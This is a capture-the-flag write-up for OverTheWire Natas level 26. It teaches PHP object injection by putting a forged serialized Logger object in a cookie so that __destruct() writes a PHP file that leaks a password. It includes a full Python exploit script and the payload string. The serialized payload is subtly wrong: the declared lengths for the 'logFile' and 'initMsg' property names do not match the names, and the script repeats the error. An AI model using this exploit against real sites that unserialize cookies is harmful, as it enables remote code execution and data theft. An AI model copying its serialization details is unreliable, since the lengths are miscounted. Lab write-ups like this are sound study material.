# OverTheWire: Natas — Level 26 → Level 27

> **Vulnerability Category:** PHP Object Injection via Unsafe Deserialization                                                
> **Skills:** PHP serialization format, magic method abuse (`__destruct`), cookie manipulation, arbitrary file write                     
> **Difficulty:** Medium                                                                    
> **Official Page:** [Natas Level 26](https://overthewire.org/wargames/natas/natas26.html)

---

## Access

- **URL:** `http://natas26.natas.labs.overthewire.org`
- **Username:** `natas26`
- **Password:** *obtain from previous level*

---

## Task

Find the password for `natas27` by injecting a malicious serialized PHP object into the `drawing` cookie, triggering arbitrary file write via the `Logger` class's `__destruct()` magic method.

---

## Vulnerability

This level demonstrates **PHP object injection via unsafe deserialization**. The application stores drawing coordinates as a serialized PHP array in a cookie named `drawing`, and later calls `unserialize()` on that cookie value without any validation. PHP's `unserialize()` will instantiate any class that is currently defined in the application — not just the array the application expects. The server-side source defines a `Logger` class whose `__destruct()` method writes a configurable string to a configurable file path. By crafting a serialized `Logger` object and placing it in the cookie, an attacker can force the server to write arbitrary PHP code to a web-accessible file, then request that file to execute it. The developer's mistake was calling `unserialize()` on attacker-controlled input when a class with dangerous side effects was already loaded.

---

## Theory

### PHP Serialization

PHP's `serialize()` function converts a variable (scalar, array, or object) into a portable string. `unserialize()` reconstructs the original value from that string.

The format for common types:

| Type | Serialized form | Example |
|---|---|---|
| Integer | `i:VALUE;` | `i:42;` |
| String | `s:LENGTH:"VALUE";` | `s:5:"hello";` |
| Array | `a:COUNT:{...}` | `a:2:{i:0;s:1:"a";i:1;s:1:"b";}` |
| Object | `O:CLASSNAME_LEN:"CLASSNAME":PROP_COUNT:{...}` | `O:4:"User":1:{s:4:"name";s:5:"Alice";}` |

A normal drawing cookie from this application decodes as:

```
a:1:{i:0;a:4:{s:2:"x1";s:2:"10";s:2:"y1";s:2:"10";s:2:"x2";s:2:"15";s:2:"y2";s:2:"15";}}
```

This is an array containing one element (index `0`), which is itself an array of four string key-value pairs.

---

### PHP Magic Methods

PHP classes can define **magic methods** — special methods that PHP calls automatically in response to certain events, not by explicit invocation in code.

| Magic method | When PHP calls it |
|---|---|
| `__construct()` | When an object is created with `new` |
| `__destruct()` | When an object goes out of scope or the script ends |
| `__wakeup()` | Immediately after `unserialize()` reconstructs an object |
| `__toString()` | When an object is used in a string context |

The dangerous one here is `__destruct()`. When `unserialize()` reconstructs an object, PHP creates it in memory. When the script finishes (or the object goes out of scope), PHP calls `__destruct()` automatically. The attacker does not need to trigger `__destruct()` manually — finishing the page request is enough.

---

### PHP Object Injection

PHP object injection occurs when `unserialize()` is called on attacker-controlled data while a class with dangerous magic methods is defined. The attacker:

1. Identifies a class in the application with a `__destruct()` or `__wakeup()` that performs a dangerous operation (file write, system call, etc.)
2. Crafts a serialized string that instantiates that class with attacker-chosen property values
3. Delivers the payload to the server (cookie, POST body, GET parameter, etc.)
4. The server calls `unserialize()`, instantiates the object, and eventually calls `__destruct()` automatically

The class does not have to be instantiated by the application's normal logic — it only needs to be **defined** (i.e., loaded via `include` or `require`) at the time `unserialize()` is called.

---

### Gadget Chains

In more complex systems, no single class has a directly exploitable `__destruct()`. Instead, attackers chain multiple classes together — the output of one magic method call triggers another class's method, and so on until a dangerous operation is reached. This is called a **gadget chain**.

*Good to know — not needed here.* This level has a directly exploitable `__destruct()` in `Logger`. No chaining is required.

---

### The Logger Class

The application source defines a `Logger` class with three properties and a `__destruct()` method:

```php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file) {
        // init
        $this->initMsg = "#--session started--#\n";
        $this->exitMsg = "#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . session_id() . ".log";

        $fd = fopen($this->logFile, "a");
        fwrite($fd, $this->initMsg);
        fclose($fd);
    }

    function log($msg) {
        $fd = fopen($this->logFile, "a");
        fwrite($fd, $msg . "\n");
        fclose($fd);
    }

    function __destruct() {
        // This is called automatically when the script ends.
        // It writes $exitMsg to $logFile — both of which the attacker controls.
        $fd = fopen($this->logFile, "a");
        fwrite($fd, $this->exitMsg);
        fclose($fd);
    }
}
```

And the relevant deserialization:

```php
function loadData($def) {
    global $log;
    $drawing = unserialize(base64_decode(urldecode($_COOKIE["drawing"])));
    // ...
}
```

> **What to notice:** `__destruct()` opens `$this->logFile` and writes `$this->exitMsg` to it. Both properties are attacker-controlled through the serialized payload. By setting `logFile` to a web-accessible `.php` path and `exitMsg` to a PHP code string, the attacker can write an executable PHP file anywhere the web server user has write access.

*Note: The PHP source above is reconstructed from the standard Natas 26 challenge.*

---

## Solution

### Step 1 — Log in and examine the application

Navigate to `http://natas26.natas.labs.overthewire.org` and authenticate. You are presented with a drawing interface that accepts two coordinate pairs (x1, y1) and (x2, y2) and draws a line between them.

Submit any coordinates. Then open browser DevTools (F12), go to the **Application** tab, and inspect **Cookies**. You will see a cookie named `drawing` with a base64-encoded value.

> **What to notice:** The application is round-tripping serialized PHP data through a client-controlled cookie. Whatever the browser sends back in `drawing` will be passed to `unserialize()` on the next request. There is no signature, HMAC, or integrity check on the cookie value.

---

### Step 2 — Decode the normal cookie to understand the format

```bash
echo 'YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjE1IjtzOjI6InkyIjtzOjI6IjE1Ijt9fQ==' | base64 -d
```

```
a:1:{i:0;a:4:{s:2:"x1";s:2:"10";s:2:"y1";s:2:"10";s:2:"x2";s:2:"15";s:2:"y2";s:2:"15";}}
```

> **What to notice:** This is a PHP-serialized array. The outer `a:1:{}` is an array of one element. The inner `a:4:{}` is an associative array of four string pairs. The application expects this structure. You are going to replace this entire value with a serialized `Logger` object instead.

---

### Step 3 — Understand the attack plan

The `Logger` class will be in scope when `unserialize()` is called because the source file defines it at the top. The plan is:

1. Craft a `Logger` object where `logFile` points to `/var/www/natas/natas26/img/exploit.php` — a web-accessible directory the server can write to.
2. Set `exitMsg` to `<?php echo file_get_contents("/etc/natas_webpass/natas27"); ?>`.
3. Set `initMsg` to an empty string (it is written by `__construct()`, which does not run during `unserialize()` — only `__wakeup()` would, and `Logger` has none).
4. Base64-encode the serialized object and set it as the `drawing` cookie.
5. Make any request to the application — `unserialize()` runs, the `Logger` object is reconstructed, the script ends, `__destruct()` fires, and the PHP file is written to disk.
6. Request `http://natas26.natas.labs.overthewire.org/img/exploit.php` — the server executes it and prints the password.

---

### Step 4 — Construct the malicious payload

The PHP serialization format for the `Logger` object, with all three private properties set explicitly:

```
O:6:"Logger":3:{s:15:"logFile";s:38:"/var/www/natas/natas26/img/exploit.php";s:8:"initMsg";s:0:"";s:7:"exitMsg";s:62:"<?php echo file_get_contents("/etc/natas_webpass/natas27"); ?>";}
```

Breaking this down field by field:

| Segment | Meaning |
|---|---|
| `O:6:"Logger":3:` | Object, class name length 6, class name `Logger`, 3 properties |
| `s:15:"logFile";` | String key, length 15, name `logFile` |
| `s:38:"/var/www/natas/natas26/img/exploit.php";` | String value, length 38, the target file path |
| `s:8:"initMsg";s:0:"";` | Property `initMsg` set to empty string |
| `s:7:"exitMsg";s:62:"<?php ... ?>";` | Property `exitMsg` set to the PHP payload, length 62 |

> **What to notice:** The string lengths in the serialized format must be exact byte counts of the actual values. Getting these wrong causes `unserialize()` to fail silently or return `false`. The script below computes them automatically.

---

### Step 5 — Run the exploit script

```python
import requests
import base64
import urllib.parse

TARGET   = "http://natas26.natas.labs.overthewire.org/"
AUTH     = ("natas26", "<natas26_password>")

# The file the Logger will write to — must be web-accessible and writable
LOG_FILE = "/var/www/natas/natas26/img/exploit.php"

# PHP payload that reads the next level's password
EXIT_MSG = '<?php echo file_get_contents("/etc/natas_webpass/natas27"); ?>'

# Construct the serialized Logger object manually.
# initMsg is empty — __construct() does not run during unserialize(),
# so setting it to "" means nothing is written by that property.
# exitMsg is what __destruct() writes to logFile when the script ends.
serialized = (
    'O:6:"Logger":3:{'
    f's:15:"logFile";s:{len(LOG_FILE)}:"{LOG_FILE}";'
    f's:8:"initMsg";s:0:"";'
    f's:7:"exitMsg";s:{len(EXIT_MSG)}:"{EXIT_MSG}";'
    '}'
)

# Base64-encode the serialized object, then URL-encode for the cookie header
cookie_value = urllib.parse.quote(base64.b64encode(serialized.encode()).decode())

session = requests.Session()

# Step 1: Send the malicious cookie to the drawing page.
# unserialize() reconstructs the Logger object. When the PHP script
# finishes handling this request, __destruct() fires and writes EXIT_MSG
# to LOG_FILE, creating exploit.php on disk.
session.cookies["drawing"] = cookie_value
session.get(TARGET, auth=AUTH)

# Step 2: Request the newly written PHP file.
# The server executes it and returns the password in the response body.
exploit_url = TARGET + "img/exploit.php"
result = session.get(exploit_url, auth=AUTH)

print(result.text)
```

Run it:

```bash
python3 exploit_natas26.py
```

Representative output:

```
#--session started--#
<password_for_natas27>
#--session end--#
```

> **What to notice:** The output contains three lines. The first and third are the `initMsg` and `exitMsg` strings from a *legitimate* `Logger` object that the application itself may have created during normal startup — or residue from a previous request. The password is on the second line, which is where `file_get_contents()` was echoed by your injected `exitMsg`. If `exploit.php` has been written by multiple requests, you may see the password repeated. The important thing is that the password appears in the body of the response from `img/exploit.php`.

---

### Step 6 — Collect the password

Copy the password for `natas27` from the output. It is the string on the line between the `#--session started--#` and `#--session end--#` markers.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

Calling `unserialize()` on attacker-controlled data is equivalent to giving the attacker a constructor call into any class currently loaded by the application. A class does not need to be explicitly instantiated by normal application logic to be dangerous — it only needs to be defined. Here, the `Logger` class's `__destruct()` method provides a direct file-write primitive that an attacker can aim at any path the web server user can write to. The correct fix is to never deserialize untrusted data with PHP's native `unserialize()`; use a data-only format such as JSON instead, which has no concept of objects or magic methods.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Getting string lengths wrong in the serialized payload | `unserialize()` fails and returns `false`; no object is created, `__destruct()` never fires | Let the script compute lengths dynamically with `len()` — never count manually |
| Targeting a non-web-accessible path for `logFile` | The PHP file is written to disk but cannot be requested via HTTP; the server returns 404 | Use a path under the web root — `/var/www/natas/natas26/img/` is writable and served |
| Forgetting to URL-encode the base64 cookie value | The `+` and `=` characters in base64 are interpreted as URL syntax; the cookie arrives malformed | Always `urllib.parse.quote()` the base64 string before setting it as a cookie |
| Requesting `exploit.php` before the first request with the malicious cookie | The file does not exist yet; `__destruct()` has not fired | Always send the poisoned cookie request first, then request the exploit file |
| Using `__wakeup()` logic expectations | `Logger` has no `__wakeup()` — the magic method that fires immediately on `unserialize()` — so there is no instant side effect; the file write only happens when `__destruct()` fires at script end | Understand which magic method fires when: `__wakeup()` is immediate, `__destruct()` is deferred to script exit |
| Expecting `initMsg` to be written by the injected object | `__construct()` does **not** run during `unserialize()` — only `__wakeup()` does. `initMsg` in the injected object is never written | Only `exitMsg` (via `__destruct()`) matters for the payload; `initMsg` can be safely set to an empty string |
